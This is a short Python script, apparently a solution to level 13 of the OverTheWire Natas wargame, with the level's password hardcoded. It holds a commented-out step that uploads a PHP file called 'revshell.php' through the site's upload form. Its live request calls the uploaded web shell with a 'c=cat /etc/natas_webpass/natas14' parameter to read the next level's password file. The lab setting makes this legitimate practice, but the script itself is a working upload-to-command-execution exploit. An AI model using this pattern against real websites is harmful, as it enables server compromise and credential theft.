#!/user/bin/env python
import requests
import  re
import base64
import urllib

username = 'natas13'
password = 'lW3jYRI02ZKDBb8VtQBU1f6eDRo6WEj9'

url ='http://%s.natas.labs.overthewire.org/' % username
session = requests.Session()

#reponse = session.get(url , auth = (username, password))
#reponse = session.post(url , files={"uploadedfile" : open('revshell.php', 'rb')},data={"filename": "revshell.php","MAX_FILE_SIZE" : "1000"},auth = (username, password))
reponse = session.get(url + 'upload/lzulymdykm.php?c=cat /etc/natas_webpass/natas14',auth = (username, password))
content = reponse.text
print(content)
#print (re.findall('The password for natas12 is(.*)',content)[0])